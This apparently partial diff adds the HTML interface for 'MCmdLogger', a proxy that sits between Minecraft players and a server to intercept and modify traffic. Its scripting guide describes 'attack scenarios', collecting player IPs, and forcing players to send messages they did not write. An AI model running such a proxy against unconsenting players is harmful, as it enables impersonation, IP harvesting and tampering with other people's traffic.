@@ -1,0 +1,1890 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MCmdLogger GUI</title>
+    <link rel="stylesheet" href="styles.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <!-- Custom Title Bar -->
+    <div class="title-bar">
+        <div class="title-bar-drag">
+            <div class="app-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 2L2 7l10 5 10-5-10-5z" />
+                    <path d="M2 17l10 5 10-5" />
+                    <path d="M2 12l10 5 10-5" />
+                </svg>
+            </div>
+            <span class="app-title">MCmdLogger GUI</span>
+            <span class="version-badge">v3.10+</span>
+        </div>
+        <div class="window-controls">
+            <!-- Language Toggle Button -->
+            <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()" title="Switch Language">
+                <div class="flag-container">
+                    <div class="flag flag-us" id="flagUs">
+                        <div class="stripe stripe-red"></div>
+                        <div class="stripe stripe-white"></div>
+                        <div class="stripe stripe-red"></div>
+                        <div class="stripe stripe-white"></div>
+                        <div class="stripe stripe-red"></div>
+                        <div class="canton">
+                            <span>★</span>
+                        </div>
+                    </div>
+                    <div class="flag flag-ru hidden" id="flagRu">
+                        <div class="ru-stripe ru-white"></div>
+                        <div class="ru-stripe ru-blue"></div>
+                        <div class="ru-stripe ru-red"></div>
+                    </div>
+                </div>
+            </button>
+
+            <button class="control-btn minimize" onclick="minimizeWindow()">
+                <svg viewBox="0 0 12 12">
+                    <rect y="5" width="12" height="2" />
+                </svg>
+            </button>
+            <button class="control-btn maximize" onclick="maximizeWindow()">
+                <svg viewBox="0 0 12 12">
+                    <rect x="1" y="1" width="10" height="10" fill="none" stroke="currentColor" stroke-width="1.5" />
+                </svg>
+            </button>
+            <button class="control-btn close" onclick="closeWindow()">
+                <svg viewBox="0 0 12 12">
+                    <line x1="1" y1="1" x2="11" y2="11" stroke="currentColor" stroke-width="1.5" />
+                    <line x1="11" y1="1" x2="1" y2="11" stroke="currentColor" stroke-width="1.5" />
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Sidebar -->
+        <nav class="sidebar">
+            <div class="sidebar-section">
+                <h3 class="sidebar-title" data-i18n="nav.connection">Connection</h3>
+                <a href="#" class="sidebar-link active" data-section="connection">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10" />
+                        <path d="M2 12h20" />
+                        <path
+                            d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+                    </svg>
+                    <span data-i18n="nav.serverSetup">Server Setup</span>
+                </a>
+            </div>
+            <div class="sidebar-section">
+                <h3 class="sidebar-title" data-i18n="nav.control">Control</h3>
+                <a href="#" class="sidebar-link" data-section="console">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="4 17 10 11 4 5" />
+                        <line x1="12" y1="19" x2="20" y2="19" />
+                    </svg>
+                    <span data-i18n="nav.console">Console</span>
+                </a>
+                <a href="#" class="sidebar-link" data-section="players">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
+                        <circle cx="9" cy="7" r="4" />
+                        <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
+                        <path d="M16 3.13a4 4 0 0 1 0 7.75" />
+                    </svg>
+                    <span data-i18n="nav.players">Players</span>
+                </a>
+                <a href="#" class="sidebar-link" data-section="commands">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="16 18 22 12 16 6" />
+                        <polyline points="8 6 2 12 8 18" />
+                    </svg>
+                    <span data-i18n="nav.quickCommands">Quick Commands</span>
+                </a>
+            </div>
+            <div class="sidebar-section">
+                <h3 class="sidebar-title" data-i18n="nav.documentation">Documentation</h3>
+                <a href="#" class="sidebar-link" data-section="cmdref">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
+                        <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
+                    </svg>
+                    <span data-i18n="nav.cmdref">Commands Reference</span>
+                </a>
+                <a href="#" class="sidebar-link" data-section="scriptsguide">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z" />
+                        <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z" />
+                    </svg>
+                    <span data-i18n="nav.scriptsguide">Scripts Guide</span>
+                </a>
+            </div>
+            <div class="sidebar-section">
+                <h3 class="sidebar-title" data-i18n="nav.advanced">Advanced</h3>
+                <a href="#" class="sidebar-link" data-section="scriptstore">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="9" cy="21" r="1" />
+                        <circle cx="20" cy="21" r="1" />
+                        <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6" />
+                    </svg>
+                    <span data-i18n="nav.scriptstore">Script Store</span>
+                </a>
+                <a href="#" class="sidebar-link" data-section="scripteditor">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7" />
+                        <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z" />
+                    </svg>
+                    <span data-i18n="nav.scripteditor">Script Editor</span>
+                </a>
+                <a href="#" class="sidebar-link" data-section="integrations">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" />
+                        <path d="M13.73 21a2 2 0 0 1-3.46 0" />
+                    </svg>
+                    <span data-i18n="nav.integrations">Integrations</span>
+                </a>
+                <a href="#" class="sidebar-link" data-section="deployment">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2" />
+                        <line x1="8" y1="21" x2="16" y2="21" />
+                        <line x1="12" y1="17" x2="12" y2="21" />
+                    </svg>
+                    <span data-i18n="nav.deployment">Deployment</span>
+                </a>
+                <a href="#" class="sidebar-link" data-section="mappings">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
+                        <line x1="3" y1="9" x2="21" y2="9" />
+                        <line x1="9" y1="21" x2="9" y2="9" />
+                    </svg>
+                    <span data-i18n="nav.mappings">Version Mappings</span>
+                </a>
+            </div>
+
+            <div class="sidebar-footer">
+                <div class="status-indicator" id="statusIndicator">
+                    <span class="status-dot offline"></span>
+                    <span class="status-text" data-i18n="status.offline">Offline</span>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Connection Section -->
+            <section class="content-section active" id="connection-section">
+                <div class="section-header">
+                    <h1 data-i18n="connection.title">Server Connection</h1>
+                    <p data-i18n="connection.subtitle">Configure your MITM proxy settings to intercept Minecraft traffic
+                    </p>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card setup-card">
+                        <div class="card-header">
+                            <div class="card-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="2" y="3" width="20" height="14" rx="2" ry="2" />
+                                    <line x1="8" y1="21" x2="16" y2="21" />
+                                    <line x1="12" y1="17" x2="12" y2="21" />
+                                </svg>
+                            </div>
+                            <h2 data-i18n="connection.proxyConfig">Proxy Configuration</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="form-group">
+                                <label for="localPort">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                                        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                                    </svg>
+                                    <span data-i18n="connection.localPort">Local Port</span>
+                                </label>
+                                <input type="number" id="localPort" placeholder="25565" value="25565">
+                                <span class="input-hint" data-i18n="connection.portHint">Port for the fake server
+                                    (default: 25565)</span>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="targetServer">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <rect x="2" y="2" width="20" height="8" rx="2" ry="2" />
+                                        <rect x="2" y="14" width="20" height="8" rx="2" ry="2" />
+                                        <line x1="6" y1="6" x2="6.01" y2="6" />
+                                        <line x1="6" y1="18" x2="6.01" y2="18" />
+                                    </svg>
+                                    <span data-i18n="connection.targetServer">Target Server</span>
+                                </label>
+                                <input type="text" id="targetServer" placeholder="play.example.com:25565">
+                                <span class="input-hint" data-i18n="connection.targetHint">Target Minecraft server
+                                    address (host:port)</span>
+                            </div>
+                        </div>
+                        <div class="card-footer">
+                            <button class="btn btn-primary" id="startBtn" onclick="startServer()">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <polygon points="5 3 19 12 5 21 5 3" />
+                                </svg>
+                                <span data-i18n="connection.startProxy">Start Proxy</span>
+                            </button>
+                            <button class="btn btn-danger" id="stopBtn" onclick="stopServer()" disabled>
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
+                                </svg>
+                                <span data-i18n="connection.stop">Stop</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="card info-card">
+                        <div class="card-header">
+                            <div class="card-icon info">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <circle cx="12" cy="12" r="10" />
+                                    <line x1="12" y1="16" x2="12" y2="12" />
+                                    <line x1="12" y1="8" x2="12.01" y2="8" />
+                                </svg>
+                            </div>
+                            <h2 data-i18n="connection.howItWorks">How It Works</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-steps">
+                                <div class="info-step">
+                                    <span class="step-number">1</span>
+                                    <div class="step-content">
+                                        <h4 data-i18n="connection.step1Title">Start the Proxy</h4>
+                                        <p data-i18n="connection.step1Desc">Enter your local port and target server,
+                                            then click Start</p>
+                                    </div>
+                                </div>
+                                <div class="info-step">
+                                    <span class="step-number">2</span>
+                                    <div class="step-content">
+                                        <h4 data-i18n="connection.step2Title">Connect Players</h4>
+                                        <p data-i18n="connection.step2Desc">Have players connect to localhost:[your
+                                            port]</p>
+                                    </div>
+                                </div>
+                                <div class="info-step">
+                                    <span class="step-number">3</span>
+                                    <div class="step-content">
+                                        <h4 data-i18n="connection.step3Title">Intercept Traffic</h4>
+                                        <p data-i18n="connection.step3Desc">Monitor and modify packets in real-time</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Console Section -->
+            <section class="content-section" id="console-section">
+                <div class="section-header">
+                    <h1 data-i18n="console.title">Console</h1>
+                    <p data-i18n="console.subtitle">View output and send commands to MCmdLogger</p>
+                </div>
+
+                <div class="console-container">
+                    <div class="console-output" id="consoleOutput">
+                        <div class="console-welcome">
+                            <span class="welcome-icon">⚡</span>
+                            <p data-i18n="console.welcome">Welcome to MCmdLogger GUI Console</p>
+                            <p class="welcome-hint" data-i18n="console.welcomeHint">Start the proxy to see output here
+                            </p>
+                        </div>
+                    </div>
+                    <div class="console-input-wrapper">
+                        <span class="console-prompt">❯</span>
+                        <input type="text" id="consoleInput" placeholder="Enter command..."
+                            data-i18n-placeholder="console.inputPlaceholder" onkeypress="handleConsoleInput(event)">
+                        <button class="btn btn-small" onclick="sendConsoleCommand()">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <line x1="22" y1="2" x2="11" y2="13" />
+                                <polygon points="22 2 15 22 11 13 2 9 22 2" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Players Section -->
+            <section class="content-section" id="players-section">
+                <div class="section-header">
+                    <h1 data-i18n="players.title">Connected Players</h1>
+                    <p data-i18n="players.subtitle">Manage and interact with connected players</p>
+                </div>
+
+                <div class="players-container">
+                    <div class="players-empty" id="playersEmpty">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
+                            <circle cx="9" cy="7" r="4" />
+                            <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
+                            <path d="M16 3.13a4 4 0 0 1 0 7.75" />
+                        </svg>
+                        <h3 data-i18n="players.noPlayers">No Players Connected</h3>
+                        <p data-i18n="players.noPlayersHint">Players will appear here when they connect to your proxy
+                        </p>
+                    </div>
+                    <div class="players-list" id="playersList" style="display: none;">
+                        <!-- Players will be dynamically added here -->
+                    </div>
+                </div>
+
+                <div class="quick-actions">
+                    <h3 data-i18n="players.quickActions">Quick Actions</h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-outline" onclick="sendCommand('list')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <line x1="8" y1="6" x2="21" y2="6" />
+                                <line x1="8" y1="12" x2="21" y2="12" />
+                                <line x1="8" y1="18" x2="21" y2="18" />
+                                <line x1="3" y1="6" x2="3.01" y2="6" />
+                                <line x1="3" y1="12" x2="3.01" y2="12" />
+                                <line x1="3" y1="18" x2="3.01" y2="18" />
+                            </svg>
+                            <span data-i18n="players.listPlayers">List Players</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Quick Commands Section -->
+            <section class="content-section" id="commands-section">
+                <div class="section-header">
+                    <h1 data-i18n="commands.title">Quick Commands</h1>
+                    <p data-i18n="commands.subtitle">Execute common MCmdLogger commands with one click</p>
+                </div>
+
+                <div class="commands-grid">
+                    <div class="command-card" onclick="sendCommand('help')">
+                        <div class="command-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10" />
+                                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
+                                <line x1="12" y1="17" x2="12.01" y2="17" />
+                            </svg>
+                        </div>
+                        <h3 data-i18n="commands.help">Help</h3>
+                        <p data-i18n="commands.helpDesc">Show all available commands</p>
+                        <code>help</code>
+                    </div>
+
+                    <div class="command-card" onclick="sendCommand('list')">
+                        <div class="command-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <line x1="8" y1="6" x2="21" y2="6" />
+                                <line x1="8" y1="12" x2="21" y2="12" />
+                                <line x1="8" y1="18" x2="21" y2="18" />
+                                <line x1="3" y1="6" x2="3.01" y2="6" />
+                                <line x1="3" y1="12" x2="3.01" y2="12" />
+                                <line x1="3" y1="18" x2="3.01" y2="18" />
+                            </svg>
+                        </div>
+                        <h3 data-i18n="commands.list">List</h3>
+                        <p data-i18n="commands.listDesc">Show connected players</p>
+                        <code>list</code>
+                    </div>
+
+                    <div class="command-card" onclick="sendCommand('vermaps info')">
+                        <div class="command-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10" />
+                                <line x1="12" y1="16" x2="12" y2="12" />
+                                <line x1="12" y1="8" x2="12.01" y2="8" />
+                            </svg>
+                        </div>
+                        <h3 data-i18n="commands.vermapsInfo">Version Mappings Info</h3>
+                        <p data-i18n="commands.vermapsInfoDesc">Show current mappings info</p>
+                        <code>vermaps info</code>
+                    </div>
+
+                    <div class="command-card" onclick="sendCommand('vermaps build prismarine')">
+                        <div class="command-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <polyline points="4 17 10 11 4 5" />
+                                <line x1="12" y1="19" x2="20" y2="19" />
+                            </svg>
+                        </div>
+                        <h3 data-i18n="commands.buildPrismarine">Build Prismarine Mappings</h3>
+                        <p data-i18n="commands.buildPrismarineDesc">Update version mappings</p>
+                        <code>vermaps build prismarine</code>
+                    </div>
+                </div>
+
+                <div class="custom-command-section">
+                    <h3 data-i18n="commands.customCommand">Custom Command</h3>
+                    <div class="custom-command-input">
+                        <input type="text" id="customCommand" placeholder="Enter any command..."
+                            data-i18n-placeholder="commands.customPlaceholder">
+                        <button class="btn btn-primary" onclick="sendCustomCommand()"
+                            data-i18n="commands.execute">Execute</button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Scripts Section -->
+            <section class="content-section" id="scripts-section">
+                <div class="section-header">
+                    <h1 data-i18n="scripts.title">Scripts</h1>
+                    <p data-i18n="scripts.subtitle">Manage JavaScript scripts for advanced attack scenarios</p>
+                </div>
+
+                <div class="scripts-info">
+                    <div class="info-banner">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                            <polyline points="14 2 14 8 20 8" />
+                            <line x1="16" y1="13" x2="8" y2="13" />
+                            <line x1="16" y1="17" x2="8" y2="17" />
+                        </svg>
+                        <div>
+                            <h4 data-i18n="scripts.location">Script Location</h4>
+                            <p data-i18n="scripts.locationDesc">Scripts are loaded from the <code>scripts/</code>
+                                directory next to MCmdLogger executable</p>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-outline" onclick="openScriptsFolder()">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z" />
+                        </svg>
+                        <span data-i18n="scripts.openFolder">Open Scripts Folder</span>
+                    </button>
+                </div>
+
+                <div class="scripts-example">
+                    <h3 data-i18n="scripts.example">Example Script</h3>
+                    <pre><code class="language-javascript">playerJoin(player => {
+    player.on("player_message", event => {
+        if (event.text === "/ping") {
+            player.send("Pong!");
+            console.log("Pong sent to " + player.name);
+        }
+    })
+})
+
+command("kickall", () => {
+    players().forEach(player => player.kick())
+    console.log("All players kicked!")
+})</code></pre>
+                </div>
+            </section>
+
+            <!-- Mappings Section -->
+            <section class="content-section" id="mappings-section">
+                <div class="section-header">
+                    <h1 data-i18n="mappings.title">Version Mappings</h1>
+                    <p data-i18n="mappings.subtitle">Manage Minecraft protocol version mappings</p>
+                </div>
+
+                <div class="mappings-cards">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2 data-i18n="mappings.current">Current Mappings</h2>
+                        </div>
+                        <div class="card-body">
+                            <p data-i18n="mappings.currentDesc">MCmdLogger uses version mappings to parse and generate
+                                Minecraft packets.</p>
+                            <button class="btn btn-outline" onclick="sendCommand('vermaps info')">
+                                <span data-i18n="mappings.checkInfo">Check Mappings Info</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2 data-i18n="mappings.update">Update Mappings</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="mapping-options">
+                                <button class="btn btn-primary" onclick="sendCommand('vermaps build prismarine')">
+                                    <span data-i18n="mappings.buildPrismarine">Build from PrismarineJS</span>
+                                </button>
+                                <div class="form-group" style="margin-top: 1rem;">
+                                    <label data-i18n="mappings.fromGit">From Git Repository</label>
+                                    <div class="input-group">
+                                        <input type="text" id="gitUrl" placeholder="Repository URL"
+                                            data-i18n-placeholder="mappings.repoUrl">
+                                        <input type="text" id="gitBranch" placeholder="Branch (optional)"
+                                            data-i18n-placeholder="mappings.branch">
+                                        <button class="btn btn-outline" onclick="buildFromGit()"
+                                            data-i18n="mappings.build">Build</button>
+                                    </div>
+                                </div>
+                                <div class="form-group">
+                                    <label data-i18n="mappings.fromLocal">From Local Folder</label>
+                                    <div class="input-group">
+                                        <input type="text" id="localPath" placeholder="Path to mappings folder"
+                                            data-i18n-placeholder="mappings.localPath">
+                                        <button class="btn btn-outline" onclick="buildFromLocal()"
+                                            data-i18n="mappings.build">Build</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Commands Reference Section -->
+            <section class="content-section" id="cmdref-section">
+                <div class="section-header">
+                    <h1 data-i18n="cmdref.title">Commands Reference</h1>
+                    <p data-i18n="cmdref.subtitle">Complete documentation of all MCmdLogger commands</p>
+                </div>
+
+                <div class="cmd-ref-grid">
+                    <!-- Basic Commands -->
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-header">
+                            <code class="cmd-name">help</code>
+                            <span class="cmd-category">Basic</span>
+                        </div>
+                        <p class="cmd-desc" data-i18n="cmdref.helpDesc">Shows all available commands with descriptions
+                        </p>
+                        <div class="cmd-demo">
+                            <div class="demo-terminal">
+                                <div class="demo-input">❯ help</div>
+                                <div class="demo-output">
+                                    Available commands:
+                                    help - Show this help message
+                                    list - List connected players
+                                    kick &lt;player&gt; - Kick a player
+                                    vermaps - Manage version mappings
+                                    ...
+                                </div>
+                            </div>
+                        </div>
+                        <button class="btn btn-small btn-outline" onclick="sendCommand('help')">
+                            <span data-i18n="cmdref.tryIt">Try it</span>
+                        </button>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-header">
+                            <code class="cmd-name">list</code>
+                            <span class="cmd-category">Players</span>
+                        </div>
+                        <p class="cmd-desc" data-i18n="cmdref.listDesc">Lists all connected players with their info</p>
+                        <div class="cmd-demo">
+                            <div class="demo-terminal">
+                                <div class="demo-input">❯ list</div>
+                                <div class="demo-output">
+                                    Connected players (2):
+                                    • Steve (192.168.1.10:54321) v1.20.4
+                                    • Alex (192.168.1.11:54322) v1.20.4
+                                </div>
+                            </div>
+                        </div>
+                        <button class="btn btn-small btn-outline" onclick="sendCommand('list')">
+                            <span data-i18n="cmdref.tryIt">Try it</span>
+                        </button>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-header">
+                            <code class="cmd-name">kick &lt;player&gt;</code>
+                            <span class="cmd-category">Players</span>
+                        </div>
+                        <p class="cmd-desc" data-i18n="cmdref.kickDesc">Disconnects a player from the proxy</p>
+                        <div class="cmd-demo">
+                            <div class="demo-terminal">
+                                <div class="demo-input">❯ kick Steve</div>
+                                <div class="demo-output">
+                                    Player Steve has been kicked.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-header">
+                            <code class="cmd-name">vermaps info</code>
+                            <span class="cmd-category">Mappings</span>
+                        </div>
+                        <p class="cmd-desc" data-i18n="cmdref.vermapsInfoDesc">Shows information about loaded version
+                            mappings</p>
+                        <div class="cmd-demo">
+                            <div class="demo-terminal">
+                                <div class="demo-input">❯ vermaps info</div>
+                                <div class="demo-output">
+                                    Version Mappings:
+                                    Source: PrismarineJS
+                                    Versions: 1.8 - 1.21
+                                    Last updated: 2024-12-01
+                                </div>
+                            </div>
+                        </div>
+                        <button class="btn btn-small btn-outline" onclick="sendCommand('vermaps info')">
+                            <span data-i18n="cmdref.tryIt">Try it</span>
+                        </button>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-header">
+                            <code class="cmd-name">vermaps build prismarine</code>
+                            <span class="cmd-category">Mappings</span>
+                        </div>
+                        <p class="cmd-desc" data-i18n="cmdref.vermapsBuildDesc">Downloads and builds mappings from
+                            PrismarineJS</p>
+                        <div class="cmd-demo">
+                            <div class="demo-terminal">
+                                <div class="demo-input">❯ vermaps build prismarine</div>
+                                <div class="demo-output">
+                                    Downloading mappings from PrismarineJS...
+                                    Building version 1.20.4... done
+                                    Building version 1.20.6... done
+                                    Mappings updated successfully!
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-header">
+                            <code class="cmd-name">vermaps build git &lt;url&gt; [branch]</code>
+                            <span class="cmd-category">Mappings</span>
+                        </div>
+                        <p class="cmd-desc" data-i18n="cmdref.vermapsGitDesc">Builds mappings from a Git repository</p>
+                        <div class="cmd-demo">
+                            <div class="demo-terminal">
+                                <div class="demo-input">❯ vermaps build git https://github.com/example/mappings main
+                                </div>
+                                <div class="demo-output">
+                                    Cloning repository...
+                                    Building mappings... done
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Scripts Guide Section -->
+            <section class="content-section" id="scriptsguide-section">
+                <div class="section-header">
+                    <h1 data-i18n="scriptsguide.title">Scripts Guide</h1>
+                    <p data-i18n="scriptsguide.subtitle">Learn how to write scripts for MCmdLogger</p>
+                </div>
+
+                <div class="guide-content">
+                    <!-- Introduction -->
+                    <div class="guide-section">
+                        <h2>📚 Introduction</h2>
+                        <p data-i18n="scriptsguide.intro">MCmdLogger uses JavaScript for scripting. Scripts are loaded
+                            from the scripts/ folder and executed when MCmdLogger starts.</p>
+                        <button class="btn btn-outline" onclick="openScriptsFolder()">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z" />
+                            </svg>
+                            <span data-i18n="scriptsguide.openFolder">Open Scripts Folder</span>
+                        </button>
+
+                        <!-- Command Naming Warning -->
+                        <div class="warning-box" style="margin-top: 16px;">
+                            <h4 data-i18n="scriptsguide.namingTitle">⚠️ Command Naming Convention</h4>
+                            <p data-i18n="scriptsguide.namingDesc">Custom command names must follow this pattern:</p>
+                            <code class="regex-pattern">^[0-9a-z_]*$</code>
+                            <p style="margin-top: 8px;" data-i18n="scriptsguide.namingAllowed">Only lowercase letters
+                                (a-z), numbers (0-9), and underscores (_) are allowed.</p>
+                            <p><strong data-i18n="scriptsguide.namingValid">Valid:</strong> <code>kickall</code>,
+                                <code>my_cmd</code>, <code>msg2</code>
+                            </p>
+                            <p><strong data-i18n="scriptsguide.namingInvalid">Invalid:</strong> <code>KickAll</code>,
+                                <code>my-cmd</code>, <code>cmd!</code>
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Hooks -->
+                    <div class="guide-section">
+                        <h2 data-i18n="scriptsguide.hooksTitle">🪝 Hooks</h2>
+                        <p data-i18n="scriptsguide.hooksDesc">Hooks are the main way to interact with MCmdLogger. They
+                            allow you to react to events.</p>
+
+                        <div class="guide-code-block">
+                            <h4>playerJoin hook</h4>
+                            <p>Called when a player connects to the proxy:</p>
+                            <pre><code>playerJoin(player => {
+    console.log(player.name + " connected!");
+    
+    // Send welcome message
+    player.send("Welcome to the server!");
+    
+    // Listen for player leaving
+    player.on("leave", () => {
+        console.log(player.name + " left");
+    });
+});</code></pre>
+                        </div>
+
+                        <div class="guide-code-block">
+                            <h4>command hook</h4>
+                            <p>Register custom console commands:</p>
+                            <pre><code>command("kickall", "Kicks all players", () => {
+    players().forEach(p => p.kick());
+    console.log("All players kicked!");
+});
+
+// With arguments
+command("msg", "&lt;player&gt; &lt;message&gt;", "Send message to player", cmd => {
+    const args = cmd.split(" ");
+    const target = args[0];
+    const message = args.slice(1).join(" ");
+    
+    for (const p of players()) {
+        if (p.name === target) {
+            p.send(message);
+            break;
+        }
+    }
+});</code></pre>
+                        </div>
+                    </div>
+
+                    <!-- Player Object -->
+                    <div class="guide-section">
+                        <h2>👤 Player Object</h2>
+
+                        <div class="guide-table">
+                            <h4>Fields</h4>
+                            <table>
+                                <tr>
+                                    <th>Field</th>
+                                    <th>Type</th>
+                                    <th>Description</th>
+                                </tr>
+                                <tr>
+                                    <td><code>name</code></td>
+                                    <td>string</td>
+                                    <td>Player nickname</td>
+                                </tr>
+                                <tr>
+                                    <td><code>uuid</code></td>
+                                    <td>string</td>
+                                    <td>Player UUID</td>
+                                </tr>
+                                <tr>
+                                    <td><code>ip</code></td>
+                                    <td>string</td>
+                                    <td>Player IP address</td>
+                                </tr>
+                                <tr>
+                                    <td><code>version</code></td>
+                                    <td>string</td>
+                                    <td>Minecraft version</td>
+                                </tr>
+                                <tr>
+                                    <td><code>protocol</code></td>
+                                    <td>number</td>
+                                    <td>Protocol number</td>
+                                </tr>
+                            </table>
+                        </div>
+
+                        <div class="guide-table">
+                            <h4>Methods</h4>
+                            <table>
+                                <tr>
+                                    <th>Method</th>
+                                    <th>Description</th>
+                                </tr>
+                                <tr>
+                                    <td><code>send(message)</code></td>
+                                    <td>Send chat message to player</td>
+                                </tr>
+                                <tr>
+                                    <td><code>kick()</code></td>
+                                    <td>Disconnect player</td>
+                                </tr>
+                                <tr>
+                                    <td><code>kick(message)</code></td>
+                                    <td>Disconnect with message</td>
+                                </tr>
+                                <tr>
+                                    <td><code>sudo(message)</code></td>
+                                    <td>Make player send message</td>
+                                </tr>
+                                <tr>
+                                    <td><code>mute(boolean)</code></td>
+                                    <td>Mute/unmute player</td>
+                                </tr>
+                                <tr>
+                                    <td><code>deaf(boolean)</code></td>
+                                    <td>Deaf/undeaf player</td>
+                                </tr>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- Events -->
